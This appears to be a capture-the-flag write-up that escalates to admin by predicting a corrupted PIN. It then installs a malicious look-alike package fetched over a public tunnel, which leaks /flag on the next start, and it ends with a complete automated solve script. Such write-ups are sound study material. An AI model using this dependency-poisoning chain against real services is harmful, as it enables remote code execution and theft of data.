# Secure Communication - Writeup

## Challenge Info

- **Challenge Name:** Secure Communication
- **Category**: pwn
- **Flag Format**: PUCTF26{[A-Z0-9_]+_[A-F0-9]{32}}
- **File**: chal.tar.gz

## Challenge Summary

The service is a line-oriented encrypted protocol wrapped around a small Bun application.

The key points that matter for solving it are:

- the server prints an RSA public key on connect and expects ours back
- every request/response after that is RSA-OAEP/SHA-512 encrypted and base64 encoded
- messages are parsed with JSON5
- the service has an admin-only `install` command that runs:
  - `bun add --no-save --no-cache <package>`
- an `admin` user is inserted at startup with a PIN derived from `Date.now()`
- the PIN handling is broken because Bun + SQLite + JS Number coercion corrupt the intended `BigInt`

One operational note before the writeup:

- the flag rotates every time the challenge instance is started
- the exact flag I saw on one instance is not important; your exploit must extract the current flag from the current instance
- the solve script at the end of this writeup performs the full exploit and prints the current flag for the live instance

For the instance I solved, the live service port was:

```bash
nc chal.polyuctf.com 36030
```

## Step 1 - Recover the Bun source from the bundled binary

The challenge binary contains the bundled JS source as strings. Extracting those strings reveals the core logic.

Relevant recovered source:

```javascript
// cryptoUtils.ts
import { crypto } from "@std/crypto/crypto";
var keyPair = null;
async function generateKeyPair() {
  keyPair = await crypto.subtle.generateKey({
    name: "RSA-OAEP",
    modulusLength: 4096,
    publicExponent: new Uint8Array([1, 0, 1]),
    hash: "SHA-512"
  }, true, ["encrypt", "decrypt"]);
}
async function exportKey() {
  if (!keyPair)
    await generateKeyPair();
  const exported = await crypto.subtle.exportKey("spki", keyPair.publicKey);
  const exportedAsString = String.fromCharCode(...new Uint8Array(exported));
  const pemBody = btoa(exportedAsString).match(/.{1,64}/g)?.join(`\n`) || "";
  return pemBody;
}
var userKeyPair;
async function importKey(pem) {
  const pemContents = pem.replace(/\s/g, "");
  const binaryDerString = atob(pemContents);
  const binaryDer = new Uint8Array([...binaryDerString].map((char) => char.charCodeAt(0)));
  userKeyPair = await crypto.subtle.importKey("spki", binaryDer.buffer, {
    name: "RSA-OAEP",
    hash: "SHA-512"
  }, true, ["encrypt"]);
}
async function encryptMessage(message) {
  const encoder = new TextEncoder;
  const encrypted = await crypto.subtle.encrypt({ name: "RSA-OAEP" }, userKeyPair, encoder.encode(message));
  return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
}
async function decryptMessage(encryptedMessage) {
  const binaryDerString = atob(encryptedMessage);
  const binaryDer = new Uint8Array([...binaryDerString].map((char) => char.charCodeAt(0)));
  const decrypted = await crypto.subtle.decrypt({ name: "RSA-OAEP" }, keyPair.privateKey, binaryDer.buffer);
  const decoder = new TextDecoder;
  return decoder.decode(decrypted);
}
```

```javascript
// db.ts
import { Database } from "bun:sqlite";
var db = new Database(":memory:");
db.run("CREATE TABLE users (id INTEGER PRIMARY KEY, username STRING, pin INTEGER, admin BOOLEAN)");
var time = Date.now();
time -= time % 5000;
var insertUser = db.prepare("INSERT INTO users (username, pin, admin) VALUES (?, ?, ?)");
insertUser.run("admin", BigInt(time) ** 2n, true);
async function checkLogin(username, pin) {
  const getUser = db.prepare("SELECT * FROM users WHERE username = ?");
  const user = getUser.get(username);
  if (!user) {
    return false;
  }
  return user.pin === pin;
}
function isAdmin(username) {
  const getUser = db.prepare("SELECT * FROM users WHERE username = ?");
  const user = getUser.get(username);
  if (!user) {
    return false;
  }
  return user.admin;
}
```

```javascript
// index.ts
(async () => {
  console.log("My Public Key:", (await exportKey()).replace(/\s/g, ""));
  process.stdout.write("Your Public Key: ");
  let state = 0;
  let username = "";
  let admin = false;
  for await (const line of console) {
    switch (state) {
      case 0:
        try {
          await importKey(line.trim());
          console.log("Public Key imported successfully.");
          state = 1;
        } catch {
          console.log("Invalid Public Key. Please try again.");
          process.stdout.write("Your Public Key: ");
        }
        break;
      case 1:
        try {
          await decryptMessage(line);
        } catch {
          console.log("Echo:", line);
          continue;
        }
      case 2:
        const decrypted = await decryptMessage(line);
        try {
          const message = Bun.JSON5.parse(decrypted);
          if (message.command === "login") {
            if (message.username && message.pin) {
              const success = await checkLogin(message.username, parseInt(message.pin));
              if (success) {
                username = message.username;
                admin = await isAdmin(username);
                console.log(await encryptMessage(`Login successful. Welcome, ${username}!`));
              } else {
                console.log(await encryptMessage("Login failed. Invalid credentials."));
              }
            }
          } else if (message.command === "install") {
            if (!username) {
              console.log(await encryptMessage("Please login first."));
            } else if (!admin) {
              console.log(await encryptMessage("Admin privileges required."));
            } else {
              if (message.package) {
                const install = Bun.spawnSync({
                  cmd: ["bun", "add", "--no-save", "--no-cache", message.package],
                  stdout: "pipe",
                  stderr: "pipe"
                });
                if (install.exitCode === 0) {
                  console.log(await encryptMessage(`Package ${message.package} installed successfully.`));
                } else {
                  console.log(await encryptMessage("Install Error"));
                }
              }
            }
          }
        } catch {
          console.log("JSON Parse Error");
        }
        break;
    }
  }
})();
```

That immediately gave the two main ideas:

1. recover the broken admin PIN computation
2. use `install` to poison `@std/crypto/crypto`, because the service imports it at startup

## Step 2 - Understand the protocol

The protocol is not complicated once the source is recovered.

### Handshake

On connect the server sends:

```text
My Public Key: <base64 DER-encoded SPKI>
Your Public Key:
```

The client must:

1. generate its own RSA keypair
2. send the public key as base64 DER SPKI
3. then encrypt every JSON5 request with the server public key using RSA-OAEP/SHA-512
4. decrypt every response with the client private key using RSA-OAEP/SHA-512

### Example request format

Plaintext JSON5 payloads look like this:

```json5
{command:"login",username:"admin",pin:"1234"}
```

The wire format is:

- `base64(RSA_OAEP_SHA512_encrypt(server_pubkey, plaintext_json5))`

and responses are the same in reverse using our public key.

## Step 3 - Verify whether each connection is a fresh process

Because the admin PIN is seeded from `Date.now()` at startup, the next question is whether the server process is persistent or recreated per connection.

I tested that by connecting multiple times and comparing the announced public keys.

Minimal test logic:

```python
def get_server_key():
    io = remote('chal.polyuctf.com', 36030)
    line = io.recvline().decode().strip()
    io.close()
    return line

print(get_server_key())
print(get_server_key())
print(get_server_key())
```

The `My Public Key:` value changed every single time.

That proves:

- each connection launches a fresh Bun process
- the SQLite database is recreated per connection
- the admin PIN must be recomputed for the current connection time bucket
- after poisoning the dependency, a new connection is needed to trigger the malicious import on startup

## Step 4 - Reproduce the broken admin PIN logic

The intended admin PIN is:

```python
t = floor(Date.now() / 5000) * 5000
pin = BigInt(t) ** 2n
```

But the database column is `INTEGER`, and the login check is:

```javascript
user.pin === parseInt(message.pin)
```

So the `BigInt` does not survive intact.

### Local coercion test

I reproduced the exact Bun + SQLite behavior locally by inserting the same value into `bun:sqlite` and reading it back.

What matters in practice is:

1. take only the low 64 bits of `t*t`
2. interpret that as signed 64-bit
3. convert that huge signed integer to JS `Number`
4. stringify it the way `parseInt` will accept

The working formula is:

```python
t = floor(now_ms / 5000) * 5000
mod = (t * t) & ((1 << 64) - 1)
signed = mod - (1 << 64) if mod >= (1 << 63) else mod
pin = str(int(float(signed)))
```

The `float(...)` step is important because the retrieved SQLite value is ultimately compared as a JS Number, not as a precise 64-bit integer.

## Step 5 - Bruteforce the correct time bucket

Because the remote host time can differ slightly from ours, I brute-forced nearby 5-second buckets around the local clock.

The payload I used is:

```json5
{command:"login",username:"admin",pin:"<candidate>"}
```

The brute-force loop is:

```python
now_ms = int(time.time() * 1000)
for delta in range(-30000, 30001, 5000):
    t = now_ms + delta
    t -= t % 5000
    mod = (t * t) & ((1 << 64) - 1)
    signed = mod - (1 << 64) if mod >= (1 << 63) else mod
    pin = str(int(float(signed)))
```

Then try login for each candidate until the server returns:

```text
Login successful. Welcome, admin!
```

This worked reliably with a +/-30 second search window.

## Step 6 - Find a useful post-auth primitive

The admin-only primitive is:

```javascript
Bun.spawnSync({
  cmd: ["bun", "add", "--no-save", "--no-cache", message.package],
  stdout: "pipe",
  stderr: "pipe"
});
```

Initially I checked the obvious dead ends:

- command injection through package name: not possible, because `spawnSync` is called with an argv array, not a shell
- `ping` bin replacement through `node_modules/.bin`: not useful, because Bun resolved `/usr/bin/ping` directly in my tests
- dependency lifecycle scripts: Bun blocked dependency postinstall scripts by default in my tests, so that was not the intended path

The real opportunity was in the startup import:

```javascript
import { crypto } from "@std/crypto/crypto";
```

Bun supports alias installation syntax like:

```bash
bun add @scope/name@https://example.com/pkg.tgz
```

Locally, I verified that installing:

```bash
bun add --no-save --no-cache @std/crypto@file:/tmp/malstdpkg.tgz
```

caused future imports of `@std/crypto/crypto` to resolve into files from that tarball.

That is the intended pivot.

## Step 7 - Build a malicious replacement for `@std/crypto`

I created a tarball whose `crypto.js` prints `/flag` and then exports the real `globalThis.crypto` so the program can keep running.

### Malicious package layout

`package/package.json`

```json
{
  "name": "leakstdcrypto",
  "version": "1.0.0",
  "type": "module"
}
```

`package/crypto.js`

```javascript
import { readFileSync } from "node:fs";
console.log("FLAG_LEAK:", readFileSync("/flag", "utf8").trim());
export const crypto = globalThis.crypto;
```

Then I packed it as a tarball.

## Step 8 - Host the tarball over HTTPS

I used `localhost.run`, because the service needs to fetch the package remotely and this was quick to stand up.

### Commands

Serve the tarball directory locally:

```bash
python3 -m http.server 8014 --directory /tmp/securecomm-final/pkg
```

Create a public HTTPS tunnel:

```bash
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -R 80:127.0.0.1:8014 \
    localhost.run
```

`localhost.run` prints a line like:

```text
abcd1234ef5678.lhr.life tunneled with tls termination, https://abcd1234ef5678.lhr.life
```

That gives us a public HTTPS URL for the tarball, for example:

```text
https://abcd1234ef5678.lhr.life/leakstdcrypto.tgz
```

I used `localhost.run` because I tested it end-to-end during the solve. Any other HTTPS tunnel would also work.

## Step 9 - Install the malicious alias as admin

After logging in as admin, I sent this payload:

```json5
{command:"install",package:"@std/crypto@https://abcd1234ef5678.lhr.life/leakstdcrypto.tgz"}
```

The success signal is:

```text
Package @std/crypto@https://abcd1234ef5678.lhr.life/leakstdcrypto.tgz installed successfully.
```

That means the current instance has installed our malicious replacement package.

## Step 10 - Trigger the malicious import and leak the flag

Because the service is a fresh process per connection, the next connection is the trigger.

On the next connection, before the normal handshake finishes, Bun imports `@std/crypto/crypto` at startup, which runs our `crypto.js`.

That makes the service print:

```text
FLAG_LEAK: <current_flag>
```

before the normal `My Public Key:` line.

So the final step is simply: open a fresh TCP connection and read lines until `FLAG_LEAK:` appears.

That leaked the current flag for the current challenge instance.

Again: the flag rotates every time the challenge instance is started, so your extracted value will differ from mine.

The flag I obtained in this instance was: `PUCTF26{b0n_i5_f0n_w1t2_s3l7t5_A3T8hrwLLQBAgVInEKunnmMvXj5kmUra}`

## Relevant Payloads Used

### Handshake

Client sends its own base64 DER SPKI public key.

### Login payload

```json5
{command:"login",username:"admin",pin:"<candidate_pin>"}
```

### Install payload

```json5
{command:"install",package:"@std/crypto@https://<public-tunnel>/leakstdcrypto.tgz"}
```

### Success signals

Admin login succeeded when the decrypted response was:

```text
Login successful. Welcome, admin!
```

Package install succeeded when the decrypted response was:

```text
Package @std/crypto@https://<public-tunnel>/leakstdcrypto.tgz installed successfully.
```

Flag exfil succeeded when the fresh connection printed:

```text
FLAG_LEAK: <current_flag>
```

## Why this works

The full chain is:

1. every connection starts a fresh process
2. startup inserts `admin` with PIN `BigInt(time_rounded_to_5s)^2`
3. SQLite/JS numeric coercion corrupts that `BigInt` into a predictable signed-64-bit-ish Number value
4. brute-forcing nearby time buckets yields the current admin PIN
5. admin can run `bun add --no-save --no-cache <package>`
6. Bun alias syntax lets us install a malicious package as `@std/crypto`
7. the next fresh process imports `@std/crypto/crypto` at startup
8. our malicious `crypto.js` reads `/flag` and prints it

## Replay Notes

- if the challenge launcher gives you a new port, use the new port
- if the challenge instance is restarted, the flag changes
- the PIN also changes per connection, so the exploit must compute it dynamically
- the included solve script does all of that automatically

## Solve Script

This is the same exploit flow described above, but fully automated. It defaults to the live host/port I used during the solve and also accepts host/port arguments.

Run it like this:

```bash
python3 solve.py chal.polyuctf.com 36030
```

Replace `36030` with the given port.

```python
import argparse
import base64
import json
import re
import select
import shutil
import subprocess
import tarfile
import time
from pathlib import Path
from typing import cast

from pwn import remote
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey


HOST = "chal.polyuctf.com"
PORT = 36030
WORKDIR = Path("/tmp/securecomm-final")
PKGDIR = WORKDIR / "pkg"
TARBALL = PKGDIR / "leakstdcrypto.tgz"
LOCAL_HTTP_PORT = 8014


def build_package():
    shutil.rmtree(WORKDIR, ignore_errors=True)
    (PKGDIR / "package").mkdir(parents=True, exist_ok=True)
    pkg_json = {
        "name": "leakstdcrypto",
        "version": "1.0.0",
        "type": "module",
    }
    (PKGDIR / "package" / "package.json").write_text(json.dumps(pkg_json))
    (PKGDIR / "package" / "crypto.js").write_text(
        'import { readFileSync } from "node:fs";\n'
        'console.log("FLAG_LEAK:", readFileSync("/flag", "utf8").trim());\n'
        "export const crypto = globalThis.crypto;\n"
    )
    with tarfile.open(TARBALL, "w:gz") as tar:
        tar.add(PKGDIR / "package", arcname="package")


def start_http_server():
    return subprocess.Popen(
        [
            "python3",
            "-m",
            "http.server",
            str(LOCAL_HTTP_PORT),
            "--directory",
            str(PKGDIR),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def start_tunnel():
    proc = subprocess.Popen(
        [
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-R",
            f"80:127.0.0.1:{LOCAL_HTTP_PORT}",
            "localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    assert proc.stdout is not None
    url = None
    deadline = time.time() + 40
    while time.time() < deadline:
        r, _, _ = select.select([proc.stdout], [], [], 1)
        if not r:
            continue
        line = proc.stdout.readline()
        if not line:
            continue
        print(line.rstrip())
        if "tunneled with tls termination" in line:
            m = re.search(r"(https://[A-Za-z0-9.-]+)", line)
            if m:
                url = m.group(1)
                break
    if not url:
        raise RuntimeError("failed to obtain tunnel URL")
    return proc, url


class Client:
    def __init__(self, host, port):
        self.io = remote(host, port)
        self.key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        self.pub_b64 = base64.b64encode(
            self.key.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        )
        line = self._recv_until_server_key()
        print(line)
        self.server_key_b64 = line.split(": ", 1)[1]
        self.server_pub = cast(
            RSAPublicKey,
            serialization.load_der_public_key(base64.b64decode(self.server_key_b64)),
        )
        self.io.recvuntil(b"Your Public Key: ")
        self.io.sendline(self.pub_b64)
        ack = self.io.recvline().decode().strip()
        print(ack)
        if ack != "Public Key imported successfully.":
            raise RuntimeError(f"unexpected handshake response: {ack}")

    def _recv_until_server_key(self):
        deadline = time.time() + 15
        while time.time() < deadline:
            line = self.io.recvline()
            if not line:
                continue
            text = line.decode(errors="replace").strip()
            if text.startswith("FLAG_LEAK:"):
                print(text)
                continue
            if text.startswith("My Public Key: "):
                return text
        raise RuntimeError("failed to receive server public key")

    def enc(self, s: str) -> bytes:
        return base64.b64encode(
            self.server_pub.encrypt(
                s.encode(),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA512()),
                    algorithm=hashes.SHA512(),
                    label=None,
                ),
            )
        )

    def dec(self, line: bytes) -> str:
        return self.key.decrypt(
            base64.b64decode(line),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA512()),
                algorithm=hashes.SHA512(),
                label=None,
            ),
        ).decode()

    def cmd_one(self, raw: str) -> str:
        self.io.sendline(self.enc(raw))
        return self.dec(self.io.recvline().strip())

    def close(self):
        self.io.close()


def fresh_process_check():
    c1 = Client(HOST, PORT)
    k1 = c1.server_key_b64
    c1.close()
    c2 = Client(HOST, PORT)
    k2 = c2.server_key_b64
    c2.close()
    print(f"Fresh process check: {k1[:32]} != {k2[:32]} -> {k1 != k2}")
    return k1 != k2


def login_admin(client: Client):
    now_ms = int(time.time() * 1000)
    for delta in range(-30000, 30001, 5000):
        t = now_ms + delta
        t -= t % 5000
        mod = (t * t) & ((1 << 64) - 1)
        signed = mod - (1 << 64) if mod >= (1 << 63) else mod
        pin = str(int(float(signed)))
        resp = client.cmd_one('{command:"login",username:"admin",pin:"%s"}' % pin)
        print(f"login t={t} pin={pin} -> {resp}")
        if "Login successful" in resp:
            return pin, t
    raise RuntimeError("admin login failed")


def main():
    global HOST, PORT

    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=HOST)
    parser.add_argument("port", nargs="?", type=int, default=PORT)
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port

    build_package()
    http_proc = start_http_server()
    tunnel_proc = None
    try:
        tunnel_proc, tunnel_url = start_tunnel()
        print("Tunnel URL:", tunnel_url)
        print("Tarball URL:", f"{tunnel_url}/{TARBALL.name}")

        assert fresh_process_check()

        c = Client(HOST, PORT)
        pin, bucket = login_admin(c)
        print(f"Chosen admin pin: {pin} (bucket {bucket})")
        install_spec = f"@std/crypto@{tunnel_url}/{TARBALL.name}"
        resp = c.cmd_one('{command:"install",package:"%s"}' % install_spec)
        print("install ->", resp)
        if "installed successfully" not in resp:
            raise RuntimeError(f"install failed: {resp}")
        c.close()

        io = remote(HOST, PORT)
        deadline = time.time() + 15
        flag = None
        while time.time() < deadline:
            line = io.recvline()
            if not line:
                continue
            text = line.decode(errors="replace").strip()
            print(text)
            m = re.search(r"FLAG_LEAK:\s*(.+)$", text)
            if m:
                flag = m.group(1)
                break
        io.close()
        if flag is None:
            raise RuntimeError("flag not found on fresh connection")
        print("FLAG:", flag)
    finally:
        if tunnel_proc is not None:
            tunnel_proc.terminate()
            try:
                tunnel_proc.wait(timeout=5)
            except Exception:
                tunnel_proc.kill()
        http_proc.terminate()
        try:
            http_proc.wait(timeout=5)
        except Exception:
            http_proc.kill()


if __name__ == "__main__":
    main()

```
